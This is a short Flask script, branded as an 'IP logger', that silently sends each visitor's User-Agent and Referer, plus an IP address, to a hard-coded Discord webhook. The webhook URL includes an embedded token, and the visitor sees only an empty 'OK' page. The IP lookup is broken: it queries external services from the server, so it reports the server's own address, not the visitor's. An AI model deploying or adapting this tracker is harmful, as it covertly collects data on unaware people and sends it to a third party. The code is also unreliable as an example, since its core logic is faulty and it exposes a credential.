from flask import Flask, request
import requests
import json
import os

app = Flask(__name__)

WEBHOOK_URL = "https://discord.com/api/webhooks/1527305360539517031/X78P4aN1u9gSLbo9mAHZkaDQTNJN-boj4e8eabaARIAFhVMgEw-1YZVpXNXeJxgQNGqQ"

def get_ip():
    # Deine bestehende get_ip Funktion hier einfügen...
    try:
        services = [
            "https://api.ipify.org?format=json",
            "https://api.myip.com",
            "https://ipinfo.io/json",
            "https://api.ip.sb/ip",
        ]
        
        for service in services:
            try:
                response = requests.get(service, timeout=5)
                if response.status_code == 200:
                    data = response.json()
                    if isinstance(data, dict):
                        ip = data.get('ip') or data.get('query') or data.get('origin')
                        if ip:
                            return ip
                    elif isinstance(data, str):
                        return data.strip()
            except:
                continue
        
        try:
            response = requests.get("https://api.ipify.org", timeout=5)
            if response.status_code == 200:
                return response.text.strip()
        except:
            pass
        
        return "Unable to get IP"
    except Exception as e:
        return f"Error: {str(e)}"

@app.route('/')
def log_ip():
    ip = get_ip()
    # Optional: Zusätzliche Infos loggen
    user_agent = request.headers.get('User-Agent')
    referrer = request.headers.get('Referer')
    
    payload = {
        "content": f"🌐 **Neuer Besucher**\n\n**IP:** `{ip}`\n**User-Agent:** `{user_agent}`",
        "embeds": [{
            "title": "IP Logger",
            "description": f"IP: `{ip}`",
            "color": 16711680,
            "fields": [
                {"name": "IP Address", "value": f"`{ip}`", "inline": False},
                {"name": "User-Agent", "value": f"`{user_agent}`", "inline": False},
                {"name": "Referrer", "value": f"`{referrer}`", "inline": False}
            ],
            "footer": {"text": "Ip logger t.me/kane_tools"}
        }]
    }
    
    try:
        requests.post(WEBHOOK_URL, json=payload, timeout=10)
    except:
        pass
    
    return "OK", 200  # Leere Antwort für den Besucher

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
